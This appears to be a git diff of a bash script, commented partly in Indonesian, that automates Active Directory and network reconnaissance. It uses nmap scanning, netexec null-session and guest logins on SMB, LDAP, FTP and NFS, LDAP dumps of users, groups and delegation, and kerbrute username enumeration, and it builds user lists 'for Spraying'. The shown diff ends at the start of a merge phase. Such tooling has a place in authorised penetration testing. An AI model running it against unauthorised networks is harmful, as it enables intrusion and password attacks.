@@ -515,189 +515,465 @@ sudo chmod +x /usr/local/bin/spray_noauth
 ```bash
 #!/bin/bash
 
+# ====================================================
+# NoAuth / Guest / Anonymous Exposure Scanner
+# Upgrade:
+# - DC detection via LDAP + Kerberos
+# - Dynamic domain discovery
+# - Kerbrute userenum per detected DC with timeout
+# - Merge LDAP users + Kerbrute users
+# - ASREP exposure audit via LDAP UAC flag, no hash dumping/cracking
+# - Binary-safe LDAP parsing
+# - Robust kerbrute path detection
+# ====================================================
+
 # --- COLORS ---
 BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 GREEN='\033[0;32m'
 PURPLE='\033[0;35m'
 YELLOW='\033[1;33m'
+RED='\033[0;31m'
 NC='\033[0m'
 
+# --- ARGUMENTS ---
 TARGET_FILE=${1:-target}
-DOMAIN_NAME=${2:-.} 
+DOMAIN_NAME=${2:-auto}
+USERLIST=${3:-/usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt}
+
+KERBRUTE_TIMEOUT=${KERBRUTE_TIMEOUT:-100}
+LDAP_TIMEOUT=${LDAP_TIMEOUT:-8}
+
+# Optional env override:
+# KERBRUTE_BIN=/usr/local/bin/kerbrute ./script.sh target
+KERBRUTE_BIN=${KERBRUTE_BIN:-}
+
+# --- OUTPUT FILES ---
 OUTDIR="spray_netexec"
 SCAN_FILE="$OUTDIR/nmap_scan.gnmap"
 RAW_OUT="$OUTDIR/raw_spray_noauth.txt"
 FINAL_OUT="$OUTDIR/final_noauth_summary.txt"
+KERBRUTE_STATUS_FILE="$OUTDIR/kerbrute_status.txt"
+MERGED_USERS_STATUS_FILE="$OUTDIR/merged_users_status.txt"
+ASREP_AUDIT_STATUS_FILE="$OUTDIR/asrep_audit_status.txt"
 
 if [[ ! -f "$TARGET_FILE" ]]; then
     echo -e "${YELLOW}[!] Error: File '$TARGET_FILE' tidak ditemukan.${NC}"
+    echo -e "${BLUE}[i] Usage:${NC}"
+    echo -e "    $0 <target_file> [domain|auto] [userlist]"
+    echo
+    echo -e "${BLUE}[i] Examples:${NC}"
+    echo -e "    $0 target"
+    echo -e "    $0 target auto /usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt"
+    echo -e "    $0 target corp.com /usr/share/seclists/Usernames/kerbrute-userstatisticallynonseclists.txt"
+    echo
+    echo -e "${BLUE}[i] Optional:${NC}"
+    echo -e "    KERBRUTE_TIMEOUT=300 $0 target"
+    echo -e "    KERBRUTE_BIN=/usr/local/bin/kerbrute $0 target"
     exit 1
 fi
 
 mkdir -p "$OUTDIR"
-echo "" > "$RAW_OUT"
+: > "$RAW_OUT"
+: > "$KERBRUTE_STATUS_FILE"
+: > "$MERGED_USERS_STATUS_FILE"
+: > "$ASREP_AUDIT_STATUS_FILE"
+
+# ====================================================
+# HELPER FUNCTIONS
+# ====================================================
+
+get_ips_by_port() {
+    grep -a " $1/open/" "$SCAN_FILE" 2>/dev/null | awk '{print $2}' | sort -u
+}
+
+dn_to_fqdn() {
+    echo "$1" | sed -E 's/DC=//g; s/,/./g; s/[[:space:]]//g'
+}
+
+fqdn_to_basedn() {
+    echo "$1" | awk -F'.' '{
+        for (i=1; i<=NF; i++) {
+            printf "DC=%s", $i
+            if (i<NF) printf ","
+        }
+        printf "\n"
+    }'
+}
+
+safe_name() {
+    echo "$1" | tr '/: ' '___'
+}
+
+clean_nxc_file() {
+    local file="$1"
+    [[ ! -f "$file" ]] && return 0
+    LC_ALL=C perl -i -pe 's/\x00//g; s/\r//g' "$file"
+}
+
+normalize_user_only_stream() {
+    # stdin -> lowercase username only, strip domain and CR, remove blanks
+    tr '[:upper:]' '[:lower:]' | \
+        sed 's/\r$//' | \
+        sed 's/@.*$//' | \
+        sed 's/\\.*$//' | \
+        awk 'NF'
+}
+
+find_kerbrute() {
+    if [[ -n "$KERBRUTE_BIN" ]]; then
+        if [[ -x "$KERBRUTE_BIN" ]]; then
+            echo "$KERBRUTE_BIN"
+            return 0
+        fi
+
+        if command -v "$KERBRUTE_BIN" >/dev/null 2>&1; then
+            command -v "$KERBRUTE_BIN"
+            return 0
+        fi
+    fi
+
+    if command -v kerbrute >/dev/null 2>&1; then
+        command -v kerbrute
+        return 0
+    fi
+
+    for kb in \
+        /usr/local/bin/kerbrute \
+        /usr/bin/kerbrute \
+        /root/go/bin/kerbrute \
+        /opt/kerbrute/kerbrute \
+        /opt/kerbrute_linux_arm64 \
+        /opt/kerbrute_linux_amd64
+    do
+        if [[ -x "$kb" ]]; then
+            echo "$kb"
+            return 0
+        fi
+    done
+
+    return 1
+}
+
+get_domain_for_dc() {
+    local ip="$1"
+    local domain=""
+    local base_dn=""
+
+    if [[ -n "$DOMAIN_NAME" && "$DOMAIN_NAME" != "auto" && "$DOMAIN_NAME" != "." ]]; then
+        echo "$DOMAIN_NAME"
+        return 0
+    fi
+
+    if command -v ldapsearch >/dev/null 2>&1; then
+        base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base defaultNamingContext 2>/dev/null | \
+                  awk -F': ' '/^defaultNamingContext:/{print $2; exit}')
+
+        if [[ -z "$base_dn" ]]; then
+            base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base namingContexts 2>/dev/null | \
+                      awk -F': ' '/^namingContexts: DC=/{print $2; exit}')
+        fi
+
+        if [[ -n "$base_dn" ]]; then
+            domain=$(dn_to_fqdn "$base_dn")
+        fi
+    fi
+
+    if [[ -z "$domain" ]] && command -v nxc >/dev/null 2>&1; then
+        domain=$(timeout 10s nxc ldap "$ip" -u '' -p '' --no-progress 2>/dev/null | \
+                 grep -aoiE 'domain:[[:space:]]*[A-Za-z0-9._-]+' | \
+                 head -n1 | awk -F':' '{print $2}' | xargs)
+
+        if [[ -z "$domain" ]]; then
+            domain=$(timeout 10s nxc smb "$ip" -u '' -p '' --no-progress 2>/dev/null | \
+                     grep -aoiE 'domain:[[:space:]]*[A-Za-z0-9._-]+' | \
+                     head -n1 | awk -F':' '{print $2}' | xargs)
+        fi
+
+        if [[ -z "$domain" ]]; then
+            domain=$(timeout 10s nxc ldap "$ip" -u '' -p '' --no-progress 2>/dev/null | \
+                     grep -aoE '\[\+\][[:space:]]+[A-Za-z0-9._-]+\\:' | \
+                     head -n1 | sed -E 's/^\[\+\][[:space:]]+//; s/\\:$//' | xargs)
+        fi
+    fi
+
+    echo "$domain"
+}
+
+get_basedn_for_dc() {
+    local ip="$1"
+    local domain="$2"
+    local base_dn=""
+
+    if command -v ldapsearch >/dev/null 2>&1; then
+        base_dn=$(timeout "${LDAP_TIMEOUT}s" ldapsearch -x -LLL -H "ldap://$ip" -s base defaultNamingContext 2>/dev/null | \
+                  awk -F': ' '/^defaultNamingContext:/{print $2; exit}')
+    fi
+
+    if [[ -z "$base_dn" && -n "$domain" ]]; then
+        base_dn=$(fqdn_to_basedn "$domain")
+    fi
+
+    echo "$base_dn"
+}
+
+# ====================================================
+# PRE-FLIGHT
+# ====================================================
 
 echo -e "${PURPLE}====================================================${NC}"
+echo -e "${GREEN}[+] PRE-FLIGHT CHECK${NC}"
+echo -e "${PURPLE}====================================================${NC}"
+
+if ! command -v nmap >/dev/null 2>&1; then
+    echo -e "${RED}[!] nmap not found. Install dulu.${NC}"
+    exit 1
+fi
+
+if ! command -v nxc >/dev/null 2>&1; then
+    echo -e "${RED}[!] nxc/netexec not found. Install dulu.${NC}"
+    exit 1
+fi
+
+RESOLVED_KERBRUTE="$(find_kerbrute || true)"
+
+if [[ -n "$RESOLVED_KERBRUTE" ]]; then
+    echo -e "${GREEN}[+] kerbrute found:${NC} $RESOLVED_KERBRUTE"
+else
+    echo -e "${YELLOW}[!] kerbrute belum ditemukan. Phase kerbrute akan di-skip.${NC}"
+fi
+
+echo -e "${BLUE}[i] Kerbrute timeout:${NC} ${KERBRUTE_TIMEOUT}s"
+
+if [[ ! -f "$USERLIST" ]]; then
+    echo -e "${YELLOW}[!] Userlist tidak ditemukan: $USERLIST${NC}"
+    echo -e "${YELLOW}[!] Phase kerbrute akan skip kecuali userlist valid diberikan.${NC}"
+else
+    echo -e "${GREEN}[+] Userlist found:${NC} $USERLIST"
+    echo -e "${BLUE}[i] Userlist lines:${NC} $(wc -l < "$USERLIST")"
+fi
+
+# ====================================================
+# PHASE 1: PORT SCANNING
+# ====================================================
+
+echo -e "\n${PURPLE}====================================================${NC}"
 echo -e "${GREEN}[+] PHASE 1: MASSIVE EFFICIENT PORT SCANNING${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
-ALL_PORTS="21,22,135,389,445,1433,2049,3389,5900,5985"
+ALL_PORTS="21,22,88,135,389,445,1433,2049,3389,5900,5985"
+
 echo -e "${CYAN}[*] Scanning $ALL_PORTS on all targets...${NC}"
 
-nmap -Pn -n -iL "$TARGET_FILE" -p "$ALL_PORTS" --version-intensity 0 -sV --host-timeout 30s --open -oG "$SCAN_FILE" > /dev/null
+nmap -Pn -n -iL "$TARGET_FILE" \
+    -p "$ALL_PORTS" \
+    --version-intensity 0 \
+    -sV \
+    --host-timeout 30s \
+    --open \
+    -oG "$SCAN_FILE" > /dev/null
 
 echo -e "${GREEN}[+] Scan selesai. Memetakan target aktif per protokol...${NC}"
 
-get_ips_by_port() { grep " $1/open/" "$SCAN_FILE" | awk '{print $2}' | sort -u; }
-
-# Mapping & Summary
 echo -e "${BLUE}----------------------------------------------------${NC}"
-for p in 445 3389 135 5985 1433 22 21 5900 2049 389; do
-    case $p in 445) proto="smb";; 3389) proto="rdp";; 135) proto="wmi";; 5985) proto="winrm";; 1433) proto="mssql";; 22) proto="ssh";; 21) proto="ftp";; 5900) proto="vnc";; 2049) proto="nfs";; 389) proto="ldap";; esac
+
+for p in 445 3389 135 5985 1433 22 21 5900 2049 389 88; do
+    case $p in
+        445) proto="smb";;
+        3389) proto="rdp";;
+        135) proto="wmi";;
+        5985) proto="winrm";;
+        1433) proto="mssql";;
+        22) proto="ssh";;
+        21) proto="ftp";;
+        5900) proto="vnc";;
+        2049) proto="nfs";;
+        389) proto="ldap";;
+        88) proto="kerberos";;
+    esac
+
     get_ips_by_port "$p" > "$OUTDIR/active_$proto.txt"
     COUNT=$(wc -l < "$OUTDIR/active_$proto.txt")
     [[ $COUNT -gt 0 ]] && echo -e "${CYAN}[*] $proto:${NC} $COUNT hosts found"
 done
+
 echo -e "${BLUE}----------------------------------------------------${NC}"
+
+# ====================================================
+# PHASE 2: NOAUTH / GUEST CHECK
+# ====================================================
 
 echo -e "\n${PURPLE}====================================================${NC}"
 echo -e "${GREEN}[+] PHASE 2: DEEP ANONYMOUS/GUEST CHECK${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
-# SMB Testing
+# ---------------- SMB Testing ----------------
+
 if [[ -s "$OUTDIR/active_smb.txt" ]]; then
     echo -e "${YELLOW}[*] SMB: Running Null Session check...${NC}"
-    timeout 40s nxc smb "$OUTDIR/active_smb.txt" -u '' -p '' --shares --no-progress 2>&1 | tee -a "$RAW_OUT"
-    
+    timeout 40s nxc smb "$OUTDIR/active_smb.txt" \
+        -u '' -p '' \
+        --shares \
+        --no-progress 2>&1 | tee -a "$RAW_OUT"
+
     echo -e "${YELLOW}[*] SMB: Running Guest Local Auth check...${NC}"
-    timeout 40s nxc smb "$OUTDIR/active_smb.txt" -u 'guest' -p '' --local-auth --shares --no-progress 2>&1 | tee -a "$RAW_OUT"
-    
-    echo -e "${YELLOW}[*] SMB: Running Guest Domain Auth check (Domain: $DOMAIN_NAME)...${NC}"
-    timeout 40s nxc smb "$OUTDIR/active_smb.txt" -u 'guest' -p '' -d "$DOMAIN_NAME" --shares --no-progress 2>&1 | tee -a "$RAW_OUT"
+    timeout 40s nxc smb "$OUTDIR/active_smb.txt" \
+        -u 'guest' -p '' \
+        --local-auth \
+        --shares \
+        --no-progress 2>&1 | tee -a "$RAW_OUT"
+
+    echo -e "${YELLOW}[*] SMB: Running Guest Domain Auth check. Domain: $DOMAIN_NAME${NC}"
+    timeout 40s nxc smb "$OUTDIR/active_smb.txt" \
+        -u 'guest' -p '' \
+        -d "$DOMAIN_NAME" \
+        --shares \
+        --no-progress 2>&1 | tee -a "$RAW_OUT"
 fi
 
-# FTP Testing & Auto-LS
+# ---------------- FTP Testing + Auto-LS ----------------
+
 if [[ -s "$OUTDIR/active_ftp.txt" ]]; then
     echo -e "${YELLOW}[*] FTP: Checking Anonymous Login & Listing Files...${NC}"
-    
-    while IFS= read -r ip; do
-        echo -e "\n${CYAN}>>> Testing FTP Anonymous: $ip${NC}"
-        
-        # Jalankan NXC FTP, tampilkan di layar, simpan ke file temporary, dan append ke log utama
-        nxc ftp "$ip" -u 'anonymous' -p '' --ls --no-progress 2>&1 | tee .tmp_ftp >> "$RAW_OUT"
 
-        if grep -q "\[+\]" .tmp_ftp; then
+    while IFS= read -r ip; do
+        [[ -z "$ip" ]] && continue
+
+        echo -e "\n${CYAN}>>> Testing FTP Anonymous: $ip${NC}"
+
+        nxc ftp "$ip" \
+            -u 'anonymous' -p '' \
+            --ls \
+            --no-progress 2>&1 | tee .tmp_ftp | tee -a "$RAW_OUT"
+
+        clean_nxc_file .tmp_ftp
+
+        if grep -aq "\[+\]" .tmp_ftp; then
             echo -e "${GREEN}[!] SUCCESS: Anonymous FTP on $ip!${NC}"
-            
-            # Simpan daftar file ke file terpisah agar mudah dibaca
+
             FTP_LOG="$OUTDIR/ftp_files_$ip.txt"
             cp .tmp_ftp "$FTP_LOG"
-            
+            clean_nxc_file "$FTP_LOG"
+
             echo -e "${BLUE}[i] File list saved to $FTP_LOG${NC}"
-            
-            # Highlight jika ada file menarik
-            if grep -iE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"; then
+
+            if grep -aiE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"; then
                 echo -e "${RED}[!!!] ALERT: Interesting files found on FTP $ip!${NC}"
-                grep -iE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"
+                grep -aiE "pass|pwd|conf|secret|user|backup|key" "$FTP_LOG"
             fi
         fi
     done < "$OUTDIR/active_ftp.txt"
+
     rm -f .tmp_ftp
 fi
 
-# LDAP Testing & Null Bind Enumeration via NXC
+# ---------------- LDAP Testing + Null Bind Enumeration ----------------
+
 if [[ -s "$OUTDIR/active_ldap.txt" ]]; then
     echo -e "${YELLOW}[*] LDAP: Checking Null Bind & Enumerating via NXC...${NC}"
-    
+
     while IFS= read -r ip; do
+        [[ -z "$ip" ]] && continue
+
         echo -e "\n${CYAN}>>> Testing LDAP Null Bind: $ip${NC}"
-        
-        # Cek Null Bind, tampilkan di layar, simpan ke temp, dan masukkan ke log utama
-        nxc ldap "$ip" -u '' -p '' --no-progress 2>&1 | tee .tmp_ldap | tee -a "$RAW_OUT"
-        
-        if grep -q "\[+\]" .tmp_ldap; then
+
+        nxc ldap "$ip" \
+            -u '' -p '' \
+            --no-progress 2>&1 | tee .tmp_ldap | tee -a "$RAW_OUT"
+
+        clean_nxc_file .tmp_ldap
+
+        if grep -aq "\[+\]" .tmp_ldap; then
             echo -e "${GREEN}[!] SUCCESS: Null Bind found on $ip!${NC}"
-            
+
             LDAP_DUMP_DIR="$OUTDIR/ldap_nxc_$ip"
             mkdir -p "$LDAP_DUMP_DIR"
             SUMMARY_FILE="$LDAP_DUMP_DIR/summary.txt"
 
-            # 2. Ambil Data Raw (Penting untuk bukti & parsing)
             echo -e "${PURPLE}[EXEC] Collecting Raw Data...${NC}"
+
             nxc ldap "$ip" -u '' -p '' --users > "$LDAP_DUMP_DIR/users.txt" 2>&1
             nxc ldap "$ip" -u '' -p '' --groups > "$LDAP_DUMP_DIR/groups.txt" 2>&1
             nxc ldap "$ip" -u '' -p '' --trusted-for-delegation > "$LDAP_DUMP_DIR/delegation.txt" 2>&1
             nxc ldap "$ip" -u '' -p '' --pass-pol > "$LDAP_DUMP_DIR/password_policy.txt" 2>&1
 
-            # --- START GENERATING SUMMARY ---
-            echo -e "${PURPLE} [SUMMARY] CREATING ENUMERATION SUMMARY...${NC}"
+            clean_nxc_file "$LDAP_DUMP_DIR/users.txt"
+            clean_nxc_file "$LDAP_DUMP_DIR/groups.txt"
+            clean_nxc_file "$LDAP_DUMP_DIR/delegation.txt"
+            clean_nxc_file "$LDAP_DUMP_DIR/password_policy.txt"
+
+            echo -e "${PURPLE}[SUMMARY] CREATING ENUMERATION SUMMARY...${NC}"
             echo -e "==== AD ENUMERATION SUMMARY ($ip) ====" > "$SUMMARY_FILE"
 
-
-            # A. Parsing Groups (The "Tank" Version)
-            echo -e "${PURPLE} [SUMMARY] Extracting Groups...${NC}"
+            # A. Groups
+            echo -e "${PURPLE}[SUMMARY] Extracting Groups...${NC}"
             echo "GroupName;Description;MemberCount" >> "$SUMMARY_FILE"
-            
-            grep "LDAP" "$LDAP_DUMP_DIR/groups.txt" | grep -vE "\[\*\]|\[\+\]|\-Group\-" | while read -r line; do
-                # 1. Bersihkan prefix LDAP sampai Hostname
-                # Menggunakan perl untuk hapus 'LDAP [IP] [PORT] [HOST]'
+
+            TMP_GLIST="$OUTDIR/.tmp_glist_$ip"
+            : > "$TMP_GLIST"
+
+            grep -a "LDAP" "$LDAP_DUMP_DIR/groups.txt" | grep -avE "\[\*\]|\[\+\]|\-Group\-" | while read -r line; do
                 clean_line=$(echo "$line" | perl -pe 's/^LDAP\s+\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+//')
-                
-                # 2. Tangkap Member Count (Angka yang sendirian di tengah spasi)
-                # Kita cari angka yang diapit spasi lebar
                 count=$(echo "$clean_line" | perl -nE 'say $1 if /\s+(\d+)\s+/')
-                
-                if [[ ! -z "$count" && "$count" -gt 0 ]]; then
-                    # 3. Nama Grup: Ambil teks SEBELUM angka member
+
+                if [[ -n "$count" && "$count" -gt 0 ]]; then
                     name=$(echo "$clean_line" | perl -pe "s/\s+$count\s+.*$//" | xargs)
-                    
-                    # 4. Deskripsi: Ambil teks SESUDAH angka member
                     desc=$(echo "$clean_line" | perl -pe "s/^.*?$count\s+//" | xargs)
-                    
-                    echo "$name;$desc;$count" >> "$SUMMARY_FILE"
-                    echo "$name" >> .tmp_glist_$ip
+
+                    if [[ -n "$name" ]]; then
+                        echo "$name;$desc;$count" >> "$SUMMARY_FILE"
+                        echo "$name" >> "$TMP_GLIST"
+                    fi
                 fi
             done
 
-            # B. Unconstrained Delegation (User Only)
+            # B. Unconstrained Delegation
             echo -e "\n[Users with Unconstrained Delegation]" >> "$SUMMARY_FILE"
-            grep "LDAP" "$LDAP_DUMP_DIR/delegation.txt" | grep -vE "\[\*\]|\[\+\]|signing:|channel binding:" | while read -r line; do
+
+            grep -a "LDAP" "$LDAP_DUMP_DIR/delegation.txt" | grep -avE "\[\*\]|\[\+\]|signing:|channel binding:" | while read -r line; do
                 user_del=$(echo "$line" | sed -E 's/^.*[0-9]{3}\s+\S+\s+//' | xargs)
-                [[ ! -z "$user_del" && ! "$user_del" == *\$ ]] && echo "$user_del" >> "$SUMMARY_FILE"
+                [[ -n "$user_del" && ! "$user_del" == *\$ ]] && echo "$user_del" >> "$SUMMARY_FILE"
             done
 
-            # C. Group Membership Mapping (Edit Final)
-            echo -e "${PURPLE} [MAPPING] Checking Group Members...${NC}"
+            # C. Group Membership Mapping
+            echo -e "${PURPLE}[MAPPING] Checking Group Members...${NC}"
             echo -e "\n[Group Membership Mapping]" >> "$SUMMARY_FILE"
             echo "GroupName;Members" >> "$SUMMARY_FILE"
 
-            if [[ -f .tmp_glist_$ip ]]; then
-                while read -r gname; do
-                    # STEP 1: Query NXC khusus grup tersebut
-                    # STEP 2: Ambil baris LDAP, buang baris Deskripsi (yang ada kata 'group')
-                    # STEP 3: Ambil kolom ke-5 (Username)
-                    m_list=$(nxc ldap "$ip" -u '' -p '' --groups "$gname" --no-progress 2>/dev/null | \
-                             grep "LDAP" | \
-                             grep -vE "\[\*\]|\[\+\]|Members of this group|Description" | \
-                             awk '{print $5}' | xargs | sed 's/ /, /g')
+            if [[ -f "$TMP_GLIST" ]]; then
+                while IFS= read -r gname; do
+                    [[ -z "$gname" ]] && continue
 
-                    # STEP 4: Bersihkan hasil jika ada karakter [-] atau sampah
+                    m_list=$(nxc ldap "$ip" \
+                        -u '' -p '' \
+                        --groups "$gname" \
+                        --no-progress 2>/dev/null | \
+                        perl -pe 's/\x00//g; s/\r//g' | \
+                        grep -a "LDAP" | \
+                        grep -avE "\[\*\]|\[\+\]|Members of this group|Description" | \
+                        awk '{print $5}' | \
+                        xargs | sed 's/ /, /g')
+
                     m_list=$(echo "$m_list" | sed 's/\[-\]//g' | xargs)
 
-                    if [[ ! -z "$m_list" && "$m_list" != "members" ]]; then
+                    if [[ -n "$m_list" && "$m_list" != "members" ]]; then
                         echo "$gname;$m_list" >> "$SUMMARY_FILE"
                     fi
-                done < .tmp_glist_$ip
-                rm -f .tmp_glist_$ip
+                done < "$TMP_GLIST"
+
+                rm -f "$TMP_GLIST"
             fi
-            # D. User Details (Parsing users.txt)
+
+            # D. User Details
             echo -e "\n[User Details]" >> "$SUMMARY_FILE"
             echo "Username;LastPWSet;BadPW;Description" >> "$SUMMARY_FILE"
-            grep "LDAP" "$LDAP_DUMP_DIR/users.txt" | grep -vE "\[\*\]|\[\+\]|\-Username\-" | while read -r line; do
+
+            grep -a "LDAP" "$LDAP_DUMP_DIR/users.txt" | grep -avE "\[\*\]|\[\+\]|\-Username\-" | while read -r line; do
                 u_content=$(echo "$line" | sed -E 's/^.*[0-9]{3}\s+\S+\s+//')
                 u_name=$(echo "$u_content" | awk '{print $1}')
-                if echo "$u_content" | grep -q "<never>"; then
+                [[ -z "$u_name" ]] && continue
+
+                if echo "$u_content" | grep -aq "<never>"; then
                     u_pw="never"
                     u_bad=$(echo "$u_content" | awk '{print $3}')
                     u_desc=$(echo "$u_content" | cut -d ' ' -f 4- | xargs)
@@ -706,42 +982,389 @@ if [[ -s "$OUTDIR/active_ldap.txt" ]]; then
                     u_bad=$(echo "$u_content" | awk '{print $4}')
                     u_desc=$(echo "$u_content" | cut -d ' ' -f 5- | xargs)
                 fi
+
                 echo "$u_name;$u_pw;$u_bad;$u_desc" >> "$SUMMARY_FILE"
             done
 
-            # E. Quick Userlist for Spraying
-            grep "LDAP" "$LDAP_DUMP_DIR/users.txt" | awk '{print $5}' | grep -vE "Username|^$" | sort -u > "$LDAP_DUMP_DIR/users_only_$ip.txt"
+            # E. Quick LDAP Userlist username-only
+            LDAP_USERS_ONLY="$LDAP_DUMP_DIR/users_only_$ip.txt"
+
+            grep -a "LDAP" "$LDAP_DUMP_DIR/users.txt" | \
+                grep -vE "\[\*\]|\[\+\]|\[\-\]|Error|operationsError" | \
+                awk '{print $NF}' | \
+                sed 's/.*\\//' | \
+                normalize_user_only_stream | \
+                grep -vE '^\s*$|^\[.*\]$' | \
+                sort -u > "$LDAP_USERS_ONLY"
+
 
             echo -e "${GREEN}[+] Summary and Mapping completed: $SUMMARY_FILE${NC}"
-            
+            echo -e "${GREEN}[+] LDAP users saved to: $LDAP_USERS_ONLY${NC}"
+
         else
             echo -e "${RED}[-] Null Bind failed on $ip.${NC}"
         fi
+
         rm -f .tmp_ldap
     done < "$OUTDIR/active_ldap.txt"
 fi
-# NFS Testing
+
+# ---------------- NFS Testing ----------------
+
 if [[ -s "$OUTDIR/active_nfs.txt" ]]; then
     echo -e "${YELLOW}[*] NFS: Listing exports...${NC}"
-    nxc nfs "$OUTDIR/active_nfs.txt" --no-progress 2>&1 | tee -a "$RAW_OUT"
+    nxc nfs "$OUTDIR/active_nfs.txt" \
+        --no-progress 2>&1 | tee -a "$RAW_OUT"
 fi
 
+# ====================================================
+# PHASE 2.5: DC DETECTION + KERBRUTE USERENUM
+# ====================================================
+
 echo -e "\n${PURPLE}====================================================${NC}"
-echo -e "${GREEN}[+] PHASE 3: CLEANING & DEDUPLICATION${NC}"
+echo -e "${GREEN}[+] PHASE 2.5: DOMAIN CONTROLLER DETECTION + KERBRUTE${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
-# Deduplikasi dan pembersihan
-sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" | grep -aE "\[\+\]|READ|WRITE|Export" | grep -av "STATUS_ACCESS_DENIED" | sort -u > "$FINAL_OUT"
+DC_CANDIDATES="$OUTDIR/dc_candidates.txt"
+DC_INFO="$OUTDIR/dc_domain_mapping.txt"
+
+: > "$DC_CANDIDATES"
+: > "$DC_INFO"
+
+if [[ -s "$OUTDIR/active_ldap.txt" && -s "$OUTDIR/active_kerberos.txt" ]]; then
+    comm -12 "$OUTDIR/active_ldap.txt" "$OUTDIR/active_kerberos.txt" > "$DC_CANDIDATES"
+fi
+
+RESOLVED_KERBRUTE="$(find_kerbrute || true)"
+
+if [[ -n "$RESOLVED_KERBRUTE" ]]; then
+    echo -e "${GREEN}[+] Kerbrute binary:${NC} $RESOLVED_KERBRUTE"
+else
+    echo -e "${YELLOW}[!] kerbrute not found. Userenum will be skipped.${NC}"
+fi
+
+if [[ -s "$DC_CANDIDATES" ]]; then
+    echo -e "${CYAN}[*] Possible Domain Controllers found:${NC}"
+    cat "$DC_CANDIDATES"
+
+    while IFS= read -r dc_ip; do
+        [[ -z "$dc_ip" ]] && continue
+
+        echo -e "\n${CYAN}>>> Checking DC candidate: $dc_ip${NC}"
+
+        discovered_domain=$(get_domain_for_dc "$dc_ip")
+
+        if [[ -z "$discovered_domain" ]]; then
+            echo -e "${YELLOW}[!] Could not auto-discover domain for $dc_ip. Skipping kerbrute.${NC}"
+            echo "$dc_ip;UNKNOWN" >> "$DC_INFO"
+            echo "KERBRUTE_STATUS;$dc_ip;UNKNOWN;SKIPPED_NO_DOMAIN;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
+            continue
+        fi
+
+        echo -e "${GREEN}[+] Domain discovered for $dc_ip: $discovered_domain${NC}"
+        echo "$dc_ip;$discovered_domain" >> "$DC_INFO"
+
+        if [[ -z "$RESOLVED_KERBRUTE" ]]; then
+            echo -e "${YELLOW}[!] kerbrute not found in PATH/common paths. Skipping userenum.${NC}"
+            echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;SKIPPED_NO_KERBRUTE;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
+            continue
+        fi
+
+        if [[ ! -f "$USERLIST" ]]; then
+            echo -e "${YELLOW}[!] Userlist not found: $USERLIST. Skipping kerbrute.${NC}"
+            echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;SKIPPED_NO_USERLIST;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
+            continue
+        fi
+
+        SAFE_DOMAIN=$(safe_name "$discovered_domain")
+        KERB_OUT="$OUTDIR/kerbrute_${dc_ip}_${SAFE_DOMAIN}.txt"
+        VALID_USERS_OUT="$OUTDIR/valid_users_${dc_ip}_${SAFE_DOMAIN}.txt"
+
+        echo -e "${YELLOW}[*] Running kerbrute userenum against $dc_ip / $discovered_domain${NC}"
+        echo -e "${BLUE}[i] Output: $KERB_OUT${NC}"
+        echo -e "${BLUE}[i] Valid users output: $VALID_USERS_OUT${NC}"
+        echo -e "${BLUE}[i] Timeout limit: ${KERBRUTE_TIMEOUT}s${NC}"
+
+        : > "$KERB_OUT"
+        : > "$VALID_USERS_OUT"
+
+        timeout "${KERBRUTE_TIMEOUT}s" "$RESOLVED_KERBRUTE" userenum \
+            -d "$discovered_domain" \
+            --dc "$dc_ip" -t 50\
+            "$USERLIST" \
+            -o "$KERB_OUT" 2>&1 | tee -a "$RAW_OUT"
+
+        KERB_RC=${PIPESTATUS[0]}
+
+        clean_nxc_file "$KERB_OUT"
+
+        grep -a "VALID USERNAME" "$KERB_OUT" 2>/dev/null | \
+            awk '{print $NF}' | \
+            normalize_user_only_stream | \
+            sort -u > "$VALID_USERS_OUT"
+
+        VALID_COUNT=$(wc -l < "$VALID_USERS_OUT" 2>/dev/null || echo 0)
+
+        if [[ "$KERB_RC" -eq 0 ]]; then
+            KERB_STATUS="COMPLETED"
+            echo -e "${GREEN}[+] Kerbrute completed for $dc_ip / $discovered_domain. Valid users: $VALID_COUNT${NC}"
+        elif [[ "$KERB_RC" -eq 124 ]]; then
+            KERB_STATUS="TIMEOUT_PARTIAL"
+            echo -e "${YELLOW}[!] Kerbrute timeout after ${KERBRUTE_TIMEOUT}s for $dc_ip / $discovered_domain. Partial valid users: $VALID_COUNT${NC}"
+        else
+            KERB_STATUS="ERROR_RC_${KERB_RC}"
+            echo -e "${RED}[!] Kerbrute ended with RC=$KERB_RC for $dc_ip / $discovered_domain. Valid users parsed: $VALID_COUNT${NC}"
+        fi
+
+        echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;$KERB_STATUS;timeout=${KERBRUTE_TIMEOUT}s;valid_users=$VALID_COUNT;output=$KERB_OUT;valid_users_file=$VALID_USERS_OUT" >> "$KERBRUTE_STATUS_FILE"
+
+        if [[ -s "$VALID_USERS_OUT" ]]; then
+            echo -e "${GREEN}[+] Kerbrute valid users saved to: $VALID_USERS_OUT${NC}"
+            cat "$VALID_USERS_OUT"
+        else
+            echo -e "${YELLOW}[!] No valid users parsed from kerbrute output for $dc_ip.${NC}"
+        fi
+
+    done < "$DC_CANDIDATES"
+else
+    echo -e "${YELLOW}[!] No DC candidate found from LDAP + Kerberos port mapping.${NC}"
+fi
+
+# ====================================================
+# PHASE 2.6: MERGE LDAP USERS + KERBRUTE USERS
+# ====================================================
+
